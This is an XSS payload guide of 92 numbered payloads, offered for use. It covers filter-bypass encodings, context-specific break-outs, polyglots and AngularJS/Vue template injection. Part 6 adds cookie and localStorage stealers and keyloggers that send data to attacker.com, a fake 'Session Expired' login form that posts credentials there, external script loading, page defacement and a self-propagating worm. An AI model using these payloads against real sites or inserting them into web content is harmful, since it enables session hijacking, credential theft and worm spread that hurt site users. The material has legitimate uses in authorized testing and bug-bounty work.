XSS (Cross-Site Scripting) Payload Guide
Part 1: Understanding XSS Fundamentals
What is XSS?
text

XSS = Cross-Site Scripting

An attack where malicious scripts are injected into trusted websites.
The script executes in the victim's browser with the website's privileges.

Three Main Types:
┌─────────────────────────────────────────────────────────────────┐
│ 1. REFLECTED XSS   - Payload in URL, reflected back immediately │
│ 2. STORED XSS      - Payload saved in database, affects all users│
│ 3. DOM-BASED XSS   - Payload manipulates DOM directly in browser │
└─────────────────────────────────────────────────────────────────┘
XSS Attack Flow
text

┌──────────────────────────────────────────────────────────────────┐
│                    REFLECTED XSS FLOW                            │
└──────────────────────────────────────────────────────────────────┘

   Attacker                    Victim                    Server
      │                          │                          │
      │  1. Crafts malicious URL │                          │
      │  ─────────────────────>  │                          │
      │  example.com/search?     │                          │
      │  q=<script>evil</script> │                          │
      │                          │                          │
      │                          │  2. Clicks link          │
      │                          │  ───────────────────────>│
      │                          │                          │
      │                          │  3. Server reflects      │
      │                          │     input in response    │
      │                          │  <───────────────────────│
      │                          │                          │
      │                          │  4. Browser executes     │
      │  5. Receives stolen data │     malicious script     │
      │  <─────────────────────  │                          │
      │  (cookies, tokens, etc)  │                          │


┌──────────────────────────────────────────────────────────────────┐
│                     STORED XSS FLOW                              │
└──────────────────────────────────────────────────────────────────┘

   Attacker                   Database                   Victims
      │                          │                          │
      │  1. Submits malicious    │                          │
      │     comment/post         │                          │
      │  ───────────────────────>│                          │
      │  <script>steal()</script>│                          │
      │                          │                          │
      │                          │  2. Stored in DB         │
      │                          │  ═══════════════         │
      │                          │                          │
      │                          │  3. Any user views page  │
      │                          │<─────────────────────────│
      │                          │                          │
      │                          │  4. Malicious script     │
      │                          │     served to ALL users  │
      │                          │─────────────────────────>│
      │                          │                          │
      │  5. Attacker receives    │                          │
      │     data from ALL victims│                          │
      │<────────────────────────────────────────────────────│

## Part 2: Basic XSS Payloads
2.1 Classic Script Tag Payloads
HTML

<!-- PAYLOAD 1: Basic Alert -->
<script>alert('XSS')</script>

DESCRIPTION: 
- Simplest XSS payload
- Injects a script tag that shows an alert box
- Used for initial testing/proof of concept
- Often blocked by basic filters

WHERE IT WORKS:
- Direct HTML injection points
- Comment fields, search boxes, user profiles

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 2: Alert with Document Domain -->
<script>alert(document.domain)</script>

DESCRIPTION:
- Shows the current domain in alert
- Proves script execution in target's context
- Useful for bug bounty reports as proof

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 3: Alert with Cookies -->
<script>alert(document.cookie)</script>

DESCRIPTION:
- Displays all accessible cookies
- Proves access to sensitive session data
- Note: HttpOnly cookies won't appear

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 4: External Script Loading -->
<script src="http://attacker.com/evil.js"></script>

DESCRIPTION:
- Loads and executes external JavaScript file
- Attacker controls the entire script
- Can be updated after injection
- More powerful than inline scripts

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 5: Script with Source and Fallback -->
<script src=//attacker.com/a.js></script>

DESCRIPTION:
- Protocol-relative URL (uses same protocol as page)
- Works on both HTTP and HTTPS sites
- Shorter payload for tight spaces
2.2 Event Handler Payloads
HTML

<!-- PAYLOAD 6: IMG Tag with onerror -->
<img src=x onerror=alert('XSS')>

DESCRIPTION:
- Uses non-existent image source
- onerror event fires when image fails to load
- No closing tag needed
- Bypasses filters looking for <script>

WHY IT WORKS:
- src=x is invalid, triggers error
- onerror executes JavaScript on error
- Very common bypass technique

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 7: IMG with onerror (variations) -->
<img src=x onerror="alert('XSS')">
<img src=x onerror='alert("XSS")'>
<img src="x" onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src=x onerror=alert`XSS`>

DESCRIPTION:
- Different quote combinations
- Last one uses template literals (backticks)
- Useful for filter evasion
- /src=x works because / is valid separator

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 8: SVG with onload -->
<svg onload=alert('XSS')>

DESCRIPTION:
- SVG element fires onload when rendered
- Shorter than img payload
- onload fires automatically, no user interaction
- Works in most modern browsers

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 9: SVG variations -->
<svg/onload=alert('XSS')>
<svg onload=alert`XSS`>
<svg onload="alert('XSS')">

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 10: Body onload -->
<body onload=alert('XSS')>

DESCRIPTION:
- Fires when body element loads
- May replace existing body tag
- Works if injected early in document

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 11: Input with onfocus + autofocus -->
<input onfocus=alert('XSS') autofocus>

DESCRIPTION:
- autofocus automatically focuses the element
- onfocus fires when element receives focus
- No user interaction required!
- Great for bypassing "no click" requirements

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 12: Input variations -->
<input onblur=alert('XSS') autofocus><input autofocus>
<input onfocus="alert('XSS')" autofocus>
<textarea onfocus=alert('XSS') autofocus>

DESCRIPTION:
- First one: autofocus moves to second input, triggering onblur
- Works without user interaction
- textarea also supports these events

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 13: Marquee tag -->
<marquee onstart=alert('XSS')>

DESCRIPTION:
- Old HTML tag for scrolling text
- onstart fires when scrolling begins
- Still works in many browsers
- Often not filtered because it's obscure

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 14: Video/Audio tags -->
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>

DESCRIPTION:
- Media elements with invalid source
- onerror triggers on load failure
- Alternative to img tag

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 15: Details/Summary tag -->
<details open ontoggle=alert('XSS')>

DESCRIPTION:
- HTML5 disclosure widget
- 'open' attribute auto-opens it
- ontoggle fires when state changes
- Works on page load with 'open'

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 16: Object tag -->
<object data="javascript:alert('XSS')">

DESCRIPTION:
- Embeds external resource
- data attribute can use javascript: protocol
- Alternative when script tag is blocked

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 17: Embed tag -->
<embed src="javascript:alert('XSS')">

DESCRIPTION:
- Similar to object tag
- Embeds external content
- javascript: protocol in src

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 18: Iframe variations -->
<iframe src="javascript:alert('XSS')">
<iframe onload=alert('XSS')>
<iframe src="data:text/html,<script>alert('XSS')</script>">

DESCRIPTION:
- First: javascript: protocol in src
- Second: onload event when iframe loads
- Third: data: URI containing HTML/script

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 19: Select/Option -->
<select onfocus=alert('XSS') autofocus>

DESCRIPTION:
- Form select element
- autofocus + onfocus combination
- Alternative to input element

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 20: Animation events -->
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart=alert('XSS')>

DESCRIPTION:
- CSS animation trigger
- onanimationstart fires when animation begins
- Requires CSS keyframe definition
- More complex but often unfiltered
Part 3: JavaScript Protocol Payloads
HTML

<!-- PAYLOAD 21: Anchor with javascript: -->
<a href="javascript:alert('XSS')">Click Me</a>

DESCRIPTION:
- Classic javascript: protocol in href
- Requires user to click the link
- Very common in older applications

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 22: Anchor with javascript: (variations) -->
<a href="javascript:alert('XSS')">Click</a>
<a href="Javascript:alert('XSS')">Click</a>
<a href="JAVASCRIPT:alert('XSS')">Click</a>
<a href="javascript&colon;alert('XSS')">Click</a>

DESCRIPTION:
- Case variations (JavaScript is case-insensitive)
- HTML entity encoding (&colon; = :)
- Bypasses case-sensitive filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 23: Form action -->
<form action="javascript:alert('XSS')">
    <input type="submit" value="Submit">
</form>

DESCRIPTION:
- javascript: in form action attribute
- Triggers on form submission
- User interaction required

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 24: Button with formaction -->
<form><button formaction="javascript:alert('XSS')">Click</button></form>

DESCRIPTION:
- formaction overrides form's action
- javascript: protocol execution
- HTML5 attribute

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 25: Area tag -->
<map><area href="javascript:alert('XSS')" shape="rect" coords="0,0,100,100"></map>
<img usemap="#x" src="valid.jpg"><map name="x"><area href="javascript:alert('XSS')"></map>

DESCRIPTION:
- Image map with clickable area
- javascript: in href
- Less commonly filtered

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 26: Meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

DESCRIPTION:
- Redirects page after 0 seconds
- javascript: in URL
- May work in some older browsers
- Often blocked in modern browsers

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 27: Base tag hijacking -->
<base href="javascript:alert('XSS');//">

DESCRIPTION:
- Changes base URL for all relative links
- When any relative link is clicked, XSS triggers
- Powerful for persistent attacks
Part 4: Encoding & Filter Bypass Payloads
4.1 HTML Entity Encoding
HTML

<!-- PAYLOAD 28: HTML Entity (Decimal) -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

DESCRIPTION:
- alert('XSS') encoded in decimal HTML entities
- &#97; = 'a', &#108; = 'l', etc.
- Browser decodes entities before execution
- Bypasses keyword filters

ENCODING TABLE:
a=&#97;  l=&#108;  e=&#101;  r=&#114;  t=&#116;
(=&#40;  )=&#41;  '=&#39;

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 29: HTML Entity (Hexadecimal) -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

DESCRIPTION:
- Same as above but hexadecimal encoding
- &#x61; = 'a', &#x6C; = 'l', etc.
- Both decimal and hex work

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 30: Mixed Encoding -->
<img src=x onerror="&#x61;lert('XSS')">

DESCRIPTION:
- Partially encoded (just first character)
- Still executes as alert('XSS')
- Confuses simple pattern matching

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 31: HTML Entity Names -->
<a href="javascript&colon;alert&lpar;&apos;XSS&apos;&rpar;">Click</a>

DESCRIPTION:
- Uses named HTML entities
- &colon; = :
- &lpar; = (
- &rpar; = )
- &apos; = '
4.2 JavaScript Encoding
HTML

<!-- PAYLOAD 32: Unicode Escapes -->
<script>\u0061\u006C\u0065\u0072\u0074('XSS')</script>

DESCRIPTION:
- JavaScript Unicode escape sequences
- \u0061 = 'a', \u006C = 'l', etc.
- Decoded by JavaScript engine
- Bypasses "alert" keyword filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 33: Hex Escapes -->
<script>\x61\x6C\x65\x72\x74('XSS')</script>

DESCRIPTION:
- JavaScript hex escape sequences
- \x61 = 'a'
- Shorter than Unicode escapes
- Also bypasses filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 34: Octal Escapes -->
<script>\141\154\145\162\164('XSS')</script>

DESCRIPTION:
- Octal escape sequences
- \141 = 'a' (97 in octal)
- Works in some JavaScript contexts

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 35: String fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

DESCRIPTION:
- Builds string from character codes
- 97='a', 108='l', 101='e', etc.
- Creates "alert('XSS')" and evals it
- Powerful obfuscation technique

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 36: atob (Base64 Decode) -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

DESCRIPTION:
- Base64 encoded payload
- atob() decodes Base64
- YWxlcnQoJ1hTUycp = alert('XSS')
- Obfuscates the payload string

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 37: Constructor Technique -->
<script>[].constructor.constructor('alert("XSS")')();</script>

DESCRIPTION:
- Uses constructor chain to access Function
- [].constructor = Array
- Array.constructor = Function
- Function('code')() executes code
- Bypasses direct function name filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 38: Template Literals -->
<script>alert`XSS`</script>

DESCRIPTION:
- ES6 template literal syntax
- No parentheses needed!
- alert`XSS` is same as alert('XSS')
- Bypasses parentheses filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 39: setTimeout/setInterval -->
<script>setTimeout('alert("XSS")',0)</script>
<script>setInterval('alert("XSS")',0)</script>

DESCRIPTION:
- Executes string as code after delay
- 0ms delay = immediate execution
- Alternative to eval()
4.3 Case & Space Manipulation
HTML

<!-- PAYLOAD 40: Case Variations -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</SCRipt>

DESCRIPTION:
- HTML tags are case-insensitive
- Bypasses case-sensitive filters
- Simple but sometimes effective

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 41: Newlines and Tabs -->
<script>
alert('XSS')
</script>

<img src=x
onerror=alert('XSS')>

<img src=x onerror=alert
('XSS')>

DESCRIPTION:
- Whitespace variations
- Newlines in tags and attributes
- May break regex-based filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 42: Null Bytes -->
<scr%00ipt>alert('XSS')</scr%00ipt>
<img src=x onerror="al%00ert('XSS')">

DESCRIPTION:
- Null byte (%00) injection
- May terminate string in some parsers
- Works in older systems
- Less effective in modern browsers

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 43: Tab and Newline in javascript: -->
<a href="java
script:alert('XSS')">Click</a>

<a href="java&#x09;script:alert('XSS')">Click</a>
<a href="java&#x0A;script:alert('XSS')">Click</a>

DESCRIPTION:
- Newline or tab breaks the keyword
- &#x09; = tab, &#x0A; = newline
- Browser ignores whitespace
- Bypasses "javascript:" filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 44: Extra Spaces -->
<img src=x onerror  =  alert('XSS')>

DESCRIPTION:
- Extra spaces around = sign
- HTML is whitespace-tolerant
- May break regex patterns
4.4 Tag and Attribute Tricks
HTML

<!-- PAYLOAD 45: Unclosed Tags -->
<script>alert('XSS')
<script>alert('XSS')<!--

DESCRIPTION:
- Missing closing tag
- Browser may auto-close
- Comment at end (<!--) hides rest of page

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 46: Malformed Tags -->
<script/src="http://attacker.com/a.js">
<script/x>alert('XSS')</script>

DESCRIPTION:
- Forward slash instead of space
- / is treated as attribute separator
- Unusual syntax confuses filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 47: Without Quotes -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

DESCRIPTION:
- No quotes around attribute values
- Valid HTML when no spaces in value
- Shorter payload

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 48: Backticks Instead of Quotes -->
<img src=x onerror=alert(`XSS`)>

DESCRIPTION:
- Template literals use backticks
- Alternative to single/double quotes
- May bypass quote filters

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 49: Expression in Attribute -->
<img src=`x` onerror=alert(1)>

DESCRIPTION:
- Backticks around src value
- Works in some browsers

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 50: Double Encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

DESCRIPTION:
- Double URL encoding
- First decode: %3Cscript%3Ealert('XSS')%3C/script%3E
- Second decode: <script>alert('XSS')</script>
- Works when input is decoded twice
Part 5: Context-Specific Payloads
5.1 Inside HTML Attribute
HTML

<!-- CONTEXT: Your input goes into an attribute -->
<!-- <input value="USER_INPUT"> -->

<!-- PAYLOAD 51: Break Out of Attribute -->
" onclick="alert('XSS')
" onfocus="alert('XSS')" autofocus="

RESULT: <input value="" onclick="alert('XSS')">
RESULT: <input value="" onfocus="alert('XSS')" autofocus="">

DESCRIPTION:
- Close the value attribute with "
- Add event handler
- May need to close with another "

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 52: Break Out and Create New Tag -->
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>

RESULT: <input value=""><script>alert('XSS')</script>">

DESCRIPTION:
- "> closes the attribute AND tag
- Then inject new tag

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 53: Single Quote Context -->
<!-- <input value='USER_INPUT'> -->
' onclick='alert("XSS")

DESCRIPTION:
- When attribute uses single quotes
- Break out with single quote
- Use double quotes in payload

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 54: Href/Src Attribute -->
<!-- <a href="USER_INPUT">Link</a> -->
javascript:alert('XSS')

RESULT: <a href="javascript:alert('XSS')">Link</a>

DESCRIPTION:
- Direct javascript: protocol injection
- Works in href, src, action, formaction

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 55: Data URI in Attribute -->
<!-- <a href="USER_INPUT">Link</a> -->
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

DESCRIPTION:
- data: URI scheme
- Can contain HTML/JavaScript
- Base64 version is obfuscated
5.2 Inside JavaScript Context
HTML

<!-- CONTEXT: Your input is inside a script -->
<!-- <script>var x = "USER_INPUT";</script> -->

<!-- PAYLOAD 56: Break String and Inject -->
";alert('XSS');//
';alert('XSS');//

RESULT: <script>var x = "";alert('XSS');//";</script>

DESCRIPTION:
- Close the string with " or '
- ; separates statements
- // comments out rest of line

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 57: Break Script Tag -->
</script><script>alert('XSS')</script>

RESULT: <script>var x = "</script><script>alert('XSS')</script>";</script>

DESCRIPTION:
- Close existing script tag
- Open new script tag
- Works even if string isn't closed properly

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 58: Template Literal Context -->
<!-- <script>var x = `USER_INPUT`;</script> -->
${alert('XSS')}

RESULT: <script>var x = `${alert('XSS')}`;</script>

DESCRIPTION:
- Template literals allow ${} expressions
- Expression is evaluated
- Direct code execution

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 59: JSON Context -->
<!-- <script>var data = {"name": "USER_INPUT"};</script> -->
"};alert('XSS');//

RESULT: <script>var data = {"name": ""};alert('XSS');//"};</script>

DESCRIPTION:
- Break out of JSON value and object
- Execute arbitrary code
- Comment out rest

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 60: Event Handler Attribute -->
<!-- <button onclick="doSomething('USER_INPUT')">Click</button> -->
');alert('XSS');//

RESULT: <button onclick="doSomething('');alert('XSS');//')">

DESCRIPTION:
- Close function call
- Add new statement
- Comment out rest
5.3 Inside CSS Context
HTML

<!-- CONTEXT: Your input is in CSS -->
<!-- <style>.class { background: USER_INPUT }</style> -->

<!-- PAYLOAD 61: CSS Expression (IE only) -->
expression(alert('XSS'))

RESULT: <style>.class { background: expression(alert('XSS')) }</style>

DESCRIPTION:
- Works ONLY in old Internet Explorer
- CSS expression evaluated as JavaScript
- Obsolete but sometimes still works

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 62: Break Out of CSS -->
}</style><script>alert('XSS')</script>

RESULT: <style>.class { background: }</style><script>alert('XSS')</script>

DESCRIPTION:
- Close CSS block and style tag
- Inject script
- Works in any browser

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 63: CSS url() with javascript (old browsers) -->
url(javascript:alert('XSS'))

DESCRIPTION:
- Old browsers allowed javascript: in url()
- Rarely works now
- Historical payload
5.4 Inside Comment Context
HTML

<!-- CONTEXT: Your input is in HTML comment -->
<!-- Welcome, USER_INPUT -->

<!-- PAYLOAD 64: Break Comment -->
--><script>alert('XSS')</script><!--

RESULT: <!-- Welcome, --><script>alert('XSS')</script><!-- -->

DESCRIPTION:
- --> closes the comment
- Inject script
- <!-- starts new comment (optional cleanup)
Part 6: Advanced Payloads
6.1 Cookie Stealing
HTML

<!-- PAYLOAD 65: Basic Cookie Stealer -->
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

DESCRIPTION:
- Creates image request to attacker's server
- Appends all cookies to URL
- Attacker logs the request
- Doesn't work on HttpOnly cookies

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 66: Fetch-based Cookie Stealer -->
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

DESCRIPTION:
- Modern fetch API
- Same concept as image technique
- May be blocked by CORS

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 67: Cookie Stealer with Encoding -->
<script>
fetch('http://attacker.com/steal?c='+btoa(document.cookie));
</script>

DESCRIPTION:
- Base64 encodes cookies
- Handles special characters
- Attacker decodes with atob()

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 68: Comprehensive Data Stealer -->
<script>
var data = {
    cookies: document.cookie,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
});
</script>

DESCRIPTION:
- Steals cookies, URL, and storage
- POST request with JSON body
- Comprehensive attack
6.2 Keyloggers
HTML

<!-- PAYLOAD 69: Basic Keylogger -->
<script>
document.onkeypress = function(e) {
    new Image().src = "http://attacker.com/log?k=" + e.key;
}
</script>

DESCRIPTION:
- Captures every keypress
- Sends each key to attacker
- Captures passwords as typed

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 70: Buffered Keylogger -->
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    if(keys.length > 20) {
        new Image().src = "http://attacker.com/log?k=" + encodeURIComponent(keys);
        keys = '';
    }
}
</script>

DESCRIPTION:
- Buffers keystrokes
- Sends in batches of 20
- Fewer requests, less suspicious
6.3 Phishing / Defacement
HTML

<!-- PAYLOAD 71: Login Form Injection -->
<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h1>Session Expired - Please Login</h1>
    <form action="http://attacker.com/phish" method="POST">
        <input name="user" placeholder="Username"><br>
        <input name="pass" type="password" placeholder="Password"><br>
        <button>Login</button>
    </form>
</div>`;
</script>

DESCRIPTION:
- Replaces entire page content
- Shows fake login form
- Credentials sent to attacker
- Victim thinks it's legitimate

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 72: Page Defacement -->
<script>
document.body.innerHTML = '<h1 style="color:red;font-size:50px;">HACKED BY XSS</h1>';
</script>

DESCRIPTION:
- Simple defacement
- Demonstrates impact
- Not stealthy
6.4 Worm Payloads
HTML

<!-- PAYLOAD 73: Self-Replicating XSS (Conceptual) -->
<script>
// Concept: XSS that posts itself to other profiles/comments
var payload = encodeURIComponent('<script>'+document.scripts[0].text+'<\/script>');
fetch('/api/post', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({message: decodeURIComponent(payload)})
});
</script>

DESCRIPTION:
- Copies itself
- Posts to other users' profiles
- Spreads automatically
- Like Samy worm on MySpace
6.5 Bypass Specific Filters
HTML

<!-- PAYLOAD 74: Bypassing 'alert' filter -->
<script>
eval('al'+'ert(1)');
window['al'+'ert'](1);
this['al'+'ert'](1);
self['al'+'ert'](1);
top['al'+'ert'](1);
</script>

DESCRIPTION:
- String concatenation to build 'alert'
- Bracket notation for function access
- Filter can't see complete 'alert'

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 75: Alternative Alert Functions -->
<script>
confirm('XSS');           // Shows OK/Cancel dialog
prompt('XSS');            // Shows input dialog  
console.log('XSS');       // Logs to console
document.write('XSS');    // Writes to page
</script>

DESCRIPTION:
- Different functions to prove XSS
- Use when 'alert' is blocked
- console.log for silent testing

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 76: Bypassing Parentheses Filter -->
<script>
alert`XSS`;                    // Template literal
onerror=alert;throw 'XSS';     // throw triggers onerror
</script>

<img src=x onerror=alert`1`>

DESCRIPTION:
- No parentheses needed
- Template literals work with functions
- throw triggers global error handler

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 77: Bypassing Quotes Filter -->
<script>
alert(/XSS/.source);           // Regex source
alert(String.fromCharCode(88,83,83));
alert(1);                      // Just use numbers
</script>

<img src=x onerror=alert(1)>

DESCRIPTION:
- /XSS/.source extracts regex content as string
- fromCharCode builds string from codes
- Numbers don't need quotes

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 78: Bypassing Space Filter -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>

DESCRIPTION:
- / can replace spaces in tags
- %09 = tab (URL encoded)
- %0a = newline (URL encoded)

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 79: Bypassing Script Filter -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

DESCRIPTION:
- Nested tags for filter that removes <script>
- Filter removes inner tags
- Result: <script>alert('XSS')</script>

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 80: DOM Clobbering -->
<form id=x><input id=y></form>
<script>alert(x.y)</script>

<img name=getElementById><img name=cookie>
<script>alert(document.getElementById)</script>

DESCRIPTION:
- HTML elements create global variables
- Can override DOM methods
- Useful for specific bypass scenarios
Part 7: DOM-Based XSS Payloads
JavaScript

// CONTEXT: Vulnerable sinks in JavaScript code

// Example vulnerable code:
// document.getElementById('output').innerHTML = location.hash.slice(1);

// PAYLOAD 81: location.hash injection
// Visit: http://example.com/page#<img src=x onerror=alert('XSS')>

DESCRIPTION:
- Payload in URL fragment (#)
- Not sent to server
- Processed client-side only
- Pure DOM-based XSS

──────────────────────────────────────────────────────────────────

// PAYLOAD 82: location.search injection
// Visit: http://example.com/page?name=<script>alert('XSS')</script>

DESCRIPTION:
- Payload in query string
- If directly used in innerHTML
- DOM XSS occurs

──────────────────────────────────────────────────────────────────

// PAYLOAD 83: document.write sink
// Vulnerable: document.write(location.href);
// Visit: http://example.com/page?<script>alert('XSS')</script>

DESCRIPTION:
- document.write is dangerous sink
- Writes directly to document
- Any script tag executes

──────────────────────────────────────────────────────────────────

// PAYLOAD 84: eval sink
// Vulnerable: eval(userInput);
// Input: alert('XSS')

DESCRIPTION:
- eval() executes any JavaScript
- Direct code injection
- Most dangerous sink

──────────────────────────────────────────────────────────────────

// PAYLOAD 85: jQuery html() sink
// Vulnerable: $('#output').html(userInput);
// Input: <img src=x onerror=alert('XSS')>

DESCRIPTION:
- jQuery's html() is like innerHTML
- Parses and executes scripts
- Common in jQuery apps

──────────────────────────────────────────────────────────────────

// PAYLOAD 86: AngularJS Template Injection
// For Angular 1.x applications
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

DESCRIPTION:
- Angular evaluates expressions in {{}}
- constructor chain reaches Function
- Sandbox escape in older Angular

──────────────────────────────────────────────────────────────────

// PAYLOAD 87: Vue.js Template Injection
{{_c.constructor('alert(1)')()}}

DESCRIPTION:
- Vue template injection
- Access to internal properties
- Execute arbitrary code
Part 8: Polyglot Payloads
HTML

<!-- PAYLOAD 88: Multi-Context Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//

DESCRIPTION:
- Works in multiple contexts
- Survives many filtering attempts
- Comments neutralize various syntaxes

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 89: Comprehensive Polyglot -->
'">><marquee><img src=x onerror=alert(1)></marquee></plaintext\></|\><plaintext/onmouseover=alert(1)><script>alert(1)</script>

DESCRIPTION:
- Multiple breaking sequences
- Various tags for different contexts
- Likely to work somewhere

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 90: SVG Polyglot -->
<svg/onload=alert(1)//

DESCRIPTION:
- Short and effective
- // comments remainder
- Works in HTML context

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 91: Image Polyglot -->
"'><img src=x onerror=alert(1)><"

DESCRIPTION:
- Breaks out of both quote types
- img tag with onerror
- Trailing characters for cleanup

──────────────────────────────────────────────────────────────────

<!-- PAYLOAD 92: Ultimate Polyglot -->
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>

DESCRIPTION:
- Closes almost every possible context
- Multiple fallback payloads
- Complex but comprehensive
Part 9: Payload Quick Reference Table
text

┌─────────────────────────────────────────────────────────────────────────┐
│                        XSS PAYLOAD QUICK REFERENCE                      │
├─────────────────────────────────────────────────────────────────────────┤
│ CONTEXT               │ PAYLOAD                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ HTML Body             │ <script>alert(1)</script>                       │
│                       │ <img src=x onerror=alert(1)>                    │
│                       │ <svg onload=alert(1)>                           │
├─────────────────────────────────────────────────────────────────────────┤
│ HTML Attribute        │ " onclick="alert(1)                             │
│ (double quote)        │ " onfocus="alert(1)" autofocus="                │
│                       │ "><script>alert(1)</script>                     │
├─────────────────────────────────────────────────────────────────────────┤
│ HTML Attribute        │ ' onclick='alert(1)                             │
│ (single quote)        │ '><script>alert(1)</script>                     │
├─────────────────────────────────────────────────────────────────────────┤
│ href/src Attribute    │ javascript:alert(1)                             │
│                       │ data:text/html,<script>alert(1)</script>        │
├─────────────────────────────────────────────────────────────────────────┤
│ JavaScript String     │ ";alert(1);//                                   │
│ (double quote)        │ </script><script>alert(1)</script>              │
├─────────────────────────────────────────────────────────────────────────┤
│ JavaScript String     │ ';alert(1);//                                   │
│ (single quote)        │ </script><script>alert(1)</script>              │
├─────────────────────────────────────────────────────────────────────────┤
│ JavaScript Template   │ ${alert(1)}                                     │
│ Literal               │ `};alert(1);//                                  │
├─────────────────────────────────────────────────────────────────────────┤
│ HTML Comment          │ --><script>alert(1)</script><!--                │
├─────────────────────────────────────────────────────────────────────────┤
│ URL Parameter         │ <script>alert(1)</script>                       │
│                       │ javascript:alert(1)                             │
├─────────────────────────────────────────────────────────────────────────┤
│ Filter Bypass:        │                                                 │
│  - No parentheses     │ alert`1`                                        │
│  - No quotes          │ alert(1)  or  alert(/XSS/.source)               │
│  - No spaces          │ <svg/onload=alert(1)>                           │
